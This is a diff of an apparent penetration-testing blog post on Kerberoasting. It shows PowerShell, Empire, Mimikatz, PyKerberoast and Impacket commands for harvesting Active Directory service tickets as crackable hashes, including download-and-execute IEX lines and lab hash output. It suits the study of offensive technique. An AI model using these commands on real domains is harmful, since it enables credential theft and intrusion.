@@ -129,20 +129,20 @@
 <p>These are stolen directly from <a href="https://twitter.com/timmedin">Tim Medin @timmedin</a>&rsquo;s <a href="https://github.com/nidem/kerberoast/blob/master/README.md">Kerberoast repository README.md</a></p>
 <p><strong>One specific ticket:</strong></p>
 <p>This is great if you are targeting one specific user account:</p>
-<pre><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  
-PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;HTTP/web01.medin.local&quot;  
+<pre tabindex="0"><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  
+PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#34;HTTP/web01.medin.local&#34;  
 </code></pre><p><strong>All the tickets (including Computer account tickets):</strong></p>
 <p>I&rsquo;m not a huge fan of this method since you get too many tickets to deal with but it&rsquo;s a great example of how to use PowerShell to parse and request things like this:</p>
-<pre><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  
-PS C:\&gt; setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
+<pre tabindex="0"><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  
+PS C:\&gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
 </code></pre><h3 id="powershell-requesting---just-users">PowerShell Requesting - Just Users</h3>
 <p><strong>Getting just the User tickets:</strong></p>
 <p>This is a slightly modified version of Tim&rsquo;s script from above. It pulls down his GetUserSPNs powershell script instead of using <code>SetSPN.exe</code> and makes a request for each of the resulting SPN tickets.</p>
-<pre><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
-PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
+<pre tabindex="0"><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
+PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&#34;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&#34;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
 </code></pre><h3 id="empire">Empire</h3>
 <p>PowerShell Empire received the functionality to get the SPN Tickets via <a href="https://twitter.com/harmj0y">@harmj0y</a>&rsquo;s commit here: <a href="https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639">b977dec</a> which as of the writing of this post was still in the <code>dev</code> branch of Empire (not master yet)</p>
-<pre><code>(Empire: BDW3E2G2ZRKCUS3B) &gt; usemodule credentials/get_spn_tickets
+<pre tabindex="0"><code>(Empire: BDW3E2G2ZRKCUS3B) &gt; usemodule credentials/get_spn_tickets
 (Empire: credentials/get_spn_tickets) &gt; info
 
            Name: Get-SPNTickets
@@ -202,11 +202,11 @@ Get-SPNTickets completed!
 <h3 id="mimikatz">Mimikatz</h3>
 <p>Using the <strong><code>kerberos::list /export</code></strong> functionality is awesome, but this will generate a file per-ticket. I have been on a few engagements where that meant 4000+ files. Luckily the awesome <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a> saves us and has included a &ldquo;base64&rdquo; mode for Mimikatz</p>
 <p>So here I&rsquo;m simply pulling the <code>Invoke-Mimikatz</code> script that <a href="https://twitter.com/JosephBialek">@JosephBialek</a> &ldquo;clymb3r&rdquo; created, into memory, telling Mimikatz to go in &ldquo;base64&rdquo; mode, export all of the active tickets and exit.</p>
-<pre><code>PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&quot;)
-PS C:\&gt; Invoke-Mimikatz -Command 'standard::base64 &quot;kerberos::list /export&quot; exit'
+<pre tabindex="0"><code>PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&#34;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#34;)
+PS C:\&gt; Invoke-Mimikatz -Command &#39;standard::base64 &#34;kerberos::list /export&#34; exit&#39;
 </code></pre><h3 id="empire-1">Empire</h3>
 <p>Here is the module:</p>
-<pre><code>(Empire: agents) &gt; usemodule credentials/mimikatz/extract_tickets
+<pre tabindex="0"><code>(Empire: agents) &gt; usemodule credentials/mimikatz/extract_tickets
 (Empire: credentials/mimikatz/extract_tickets) &gt; info
 
            Name: Invoke-Mimikatz extract kerberos tickets.
@@ -222,7 +222,7 @@ Authors:
   @gentilkiwi
 
 Description:
-  Runs PowerSploit's Invoke-Mimikatz function to extract
+  Runs PowerSploit&#39;s Invoke-Mimikatz function to extract
   kerberos tickets from memory in base64-encoded form.
 
 Options:
@@ -231,14 +231,14 @@ Options:
   ----  --------    -------                   -----------
   Agent True        None                      Agent to run module on.
 </code></pre><p>And the result&hellip;</p>
-<pre><code>Job started: Debug32_segox
+<pre tabindex="0"><code>Job started: Debug32_segox
 Hostname: win7.sittingduck.info / S-1-5-21-4217918325-2978756054-1117708521
   .#####.   mimikatz 2.1 (x64) built on Mar 31 2016 16:45:32
- .## ^ ##.  &quot;A La Vie, A L'Amour&quot;
+ .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34;
  ## / \ ##  /* * *
  ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
-  '#####'                                     with 18 modules * * */
+ &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  &#39;#####&#39;                                     with 18 modules * * */
 
 mimikatz(powershell) # standard::base64
 isBase64Intercept was    : false
@@ -271,45 +271,45 @@ GxBTSVRUSU5HRFVDSy5JTkZP
    * Saved to file     : 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
 </code></pre><p>I&rsquo;ve cut the result down quite a bit as it would scroll for a bit in this format.</p>
 <p>Now the problem is that they are all text and for you to crack things or at least convert them into a format that JtR or oclHastcat can digest they need to be in binary format. So I made this script to convert and <code>agent.log</code> file from the output of <strong><code>extract_tickets</code></strong> back into their binary format with correct file names. My coding isn&rsquo;t great, so please let me know how I can improve this script:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
-require <span style="color:#e6db74">&#39;base64&#39;</span>
-
-puts <span style="color:#66d9ef">ARGV</span><span style="color:#f92672">.</span>inspect
-
-<span style="color:#66d9ef">if</span> <span style="color:#66d9ef">ARGV</span><span style="color:#f92672">.</span>length <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>
-	puts <span style="color:#e6db74">&#34;Requires a file to parse, usually agent.log&#34;</span>
-	exit
-<span style="color:#66d9ef">end</span>
-
-border <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;====================&#34;</span>
-bordercount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-ticket <span style="color:#f92672">=</span> <span style="color:#f92672">[]</span>
-filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;failed.log&#34;</span>
-
-<span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>open(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>line<span style="color:#f92672">|</span>
-	<span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>strip <span style="color:#f92672">==</span> border
-		<span style="color:#66d9ef">case</span> bordercount
-		<span style="color:#66d9ef">when</span> <span style="color:#ae81ff">2</span>
-			<span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>open(filename, <span style="color:#e6db74">&#39;a&#39;</span>) {<span style="color:#f92672">|</span>f<span style="color:#f92672">|</span> f<span style="color:#f92672">.</span>write(<span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>decode64(ticket<span style="color:#f92672">.</span>join))}
-			bordercount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-			ticket <span style="color:#f92672">=</span> <span style="color:#f92672">[]</span>
-			filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;failed.log&#34;</span>
-		<span style="color:#66d9ef">else</span>
-			bordercount <span style="color:#f92672">=</span> bordercount <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
-		<span style="color:#66d9ef">end</span>
-	<span style="color:#66d9ef">else</span>
-		<span style="color:#66d9ef">case</span> bordercount
-		<span style="color:#66d9ef">when</span> <span style="color:#ae81ff">1</span>
-			filename <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; : &#34;</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span>
-			puts <span style="color:#e6db74">&#34;Storing </span><span style="color:#e6db74">#{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
-		<span style="color:#66d9ef">when</span> <span style="color:#ae81ff">2</span>
-			ticket <span style="color:#f92672">&lt;&lt;</span> line<span style="color:#f92672">.</span>strip
-		<span style="color:#66d9ef">end</span>
-	<span style="color:#66d9ef">end</span>
-<span style="color:#66d9ef">end</span>
-</code></pre></div><p>Save that and just feed it an <code>agent.log</code> file from Empire and WA-LA! you have kirbi files.</p>
-<pre><code>ruby parse.rb agent.log
-[&quot;agent.log&quot;]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env ruby</span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;base64&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#66d9ef">ARGV</span><span style="color:#f92672">.</span>inspect
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#66d9ef">ARGV</span><span style="color:#f92672">.</span>length <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>	puts <span style="color:#e6db74">&#34;Requires a file to parse, usually agent.log&#34;</span>
+</span></span><span style="display:flex;"><span>	exit
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>border <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;====================&#34;</span>
+</span></span><span style="display:flex;"><span>bordercount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>ticket <span style="color:#f92672">=</span> <span style="color:#f92672">[]</span>
+</span></span><span style="display:flex;"><span>filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;failed.log&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>open(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>line<span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>strip <span style="color:#f92672">==</span> border
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> bordercount
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">when</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>open(filename, <span style="color:#e6db74">&#39;a&#39;</span>) {<span style="color:#f92672">|</span>f<span style="color:#f92672">|</span> f<span style="color:#f92672">.</span>write(<span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>decode64(ticket<span style="color:#f92672">.</span>join))}
+</span></span><span style="display:flex;"><span>			bordercount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>			ticket <span style="color:#f92672">=</span> <span style="color:#f92672">[]</span>
+</span></span><span style="display:flex;"><span>			filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;failed.log&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>			bordercount <span style="color:#f92672">=</span> bordercount <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> bordercount
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">when</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>			filename <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; : &#34;</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>			puts <span style="color:#e6db74">&#34;Storing </span><span style="color:#e6db74">#{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">when</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>			ticket <span style="color:#f92672">&lt;&lt;</span> line<span style="color:#f92672">.</span>strip
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>Save that and just feed it an <code>agent.log</code> file from Empire and WA-LA! you have kirbi files.</p>
+<pre tabindex="0"><code>ruby parse.rb agent.log
+[&#34;agent.log&#34;]
 Storing 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
 Storing 1-40e10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
 Storing 2-40a10000-notanadmin@MSSQLSvc~WIN2K8R2.sittingduck.info-SITTINGDUCK.INFO.kirbi
@@ -328,7 +328,7 @@ Storing 10-40a50000-notanadmin@LDAP~DC1.sittingduck.info~sittingduck.info-SITTIN
 <li><a href="https://github.com/nidem/kerberoast/blob/master/kirbi2john.py">Kerberoast version of kirbi2john.py by Michael Kramer (SySS GmbH)</a></li>
 <li><a href="https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py">John the Ripper&rsquo;s version of kirbi2john.py by Michael Kramer - modded by Dhiru Kholia</a></li>
 </ul>
-<pre><code>root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi
+<pre tabindex="0"><code>root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi
 $krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54f7c71a700397fa53dbe5ee86ee2e30e89586c8d447f6df8489fc1b53241cf87777712d5b1a0ebf066df08b12138a52b40aab0c25c00fd1db222f06e10277771315f3be538728a140abe9f2780761197c51f3d70fe630b898539bc3aa0d688ad848110d85fd55db5692d269e45a154410784f430084c2aa1190f95cda4d13a5463418c94d016af7ff36adf2f49b80e42d73a75b12f2ea210bf663e0fdeb42e0ff0b416bbf5056cd7f87a7c122fddec81daba5d5eb390073e76fff48139281cef9c8b88af4229689ad018b432d4ecb2c4d673810bef6096507caeb9cfe963a0201cea0bdd4a58b93c72ab238dd69c48b72a189dfcac541052156659c1d1ab3ce7ee2882b93b11ba5b14679105de476e3953d5ceb7328a5d221cfd323b7deb8234be1bf0d4b8c9f02463ad6da667323478f7acba2424e4311c837db608fc27b25a24d6c1315d7927d165a0859460ed65aaabaffd488b23dfcb01c8866aad556831370e89c25a6d8843aae676186f927eadf86f187d355f4a1d97472a44dc32fc52c4b6c40f42bb84f8589ee607eff2fd511bb6eaae90640a6dd2b3557ae5ae992d025aa13c25fafe9bd5b93aa36834a715c5dcde96bda38b880797852d2cff13324a1751a9b198b60ebf81c96b8dc5edf1474fe1fa53628f3aa53416e4062c503f1efb22a8ce11ab7ba8c40bc30c816568091ad051c55b3c8780964c87b5db241224bd3280eecb7e73f2921c770ccf41fbea8e43b2a1be0c6178c799fdbe8d1fffdd4a37a2aeeebb27a4f09f669203969b80e1ab7d6e28cae00af7fd3a6c731448c97356759ecc3eefec7f6ef155bd63b84bb25b1b66f8f1908ece15dbba12219c80b6797e04315889790f9c06c611314f8cd
 </code></pre><p>But all of that is hard and creates evidence. Lets look back at the tools <a href="https://github.com/skelsec/PyKerberoast">PyKerberoast</a> and <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py">Impacket&rsquo;s GetUserSPNs.py</a> and see if there is a better way:</p>
 <h2 id="pykerberoast">PyKerberoast</h2>
@@ -338,10 +338,10 @@ $krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54
 </ul>
 <p>This awesome work by <a href="https://twitter.com/skelsec">@skelsec</a> makes it so no new Kerberos tickets need to be added to the client, no use of Mimikatz, and no need to parse anything, it just contacts the Domain Controller. It pulls out all of the information needed for the SPNs, requests the tickets and outputs them in John the Ripper format.</p>
 <p>Usage:</p>
-<pre><code>kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME
+<pre tabindex="0"><code>kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME
                 [-p PASSWORD] [-o OUTPUTFILE] [-em ENUMMACHINE] [-v]
 </code></pre><p>Example (I have snipped up some of the output to save space):</p>
-<pre><code>root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b &quot;dc=sittingduck,dc=info&quot; -d sittingduck -u notanadmin
+<pre tabindex="0"><code>root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b &#34;dc=sittingduck,dc=info&#34; -d sittingduck -u notanadmin
 [+]Starting...
 Password:
 $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af52b31c7c39808f02bceb2d728550e375ff7321f7383f4800445df2a27006950a0f88c69a447de1643a7418f056315c684382068701a62f627c6cafde81bbc657c865ddd828027cef1edc11228ea0b95caca91647fc4b581efb380e466d12e253309d65a11dcbe02b0de70e0aa9044350461ad5d4293a07e3cf588a05a04a7942b63f395c6eed5e8dc826160a7bc00e295df539e419b9a4c17762b3bc987bc339354892e51090d7a7ede236cf500438e57f47a4155cc38f8a07cfdb2e3f7033ce412a6f7856911d9cf95e659daf4269d1b31cf872b09dc86af614b95c457fc896d01fdfb0afc751d2279d4c715
@@ -354,7 +354,7 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af5
 <li>Source: <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py">https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py</a></li>
 </ul>
 <p>Just by adding a <strong><code>-request</code></strong> to our previous run we can request all of the user SPN tickets and they are output in John the Ripper format (I&rsquo;ve snipped up some of the output to save space):</p>
-<pre><code>root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin
+<pre tabindex="0"><code>root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin
 Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies
 
 Password:
@@ -418,7 +418,7 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2023</span>
             
             <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
@@ -426,7 +426,7 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
     <div class="footer__inner">
         <div class="footer__content">
             <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/mubix">mubix</a> - Theme by <a href="https://github.com/rhazdon/">Djordje Atlialp</a></span>
           </div>
     </div>
 </footer>
@@ -439,7 +439,7 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 
 
 
-<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="/bundle.min.8cc3758efe48ef82e2eb9a5f317b44c0805353a43762207be6fe8ffb05815cce7a19d37f6bf387c378a3bdfc3029981668d645374a33db4ee3480e15a4bfdc7c.js" integrity="sha512-jMN1jv5I74Li65pfMXtEwIBTU6Q3YiB75v6P&#43;wWBXM56GdN/a/OHw3ijvfwwKZgWaNZFN0oz207jSA4VpL/cfA=="></script>
 
 
 
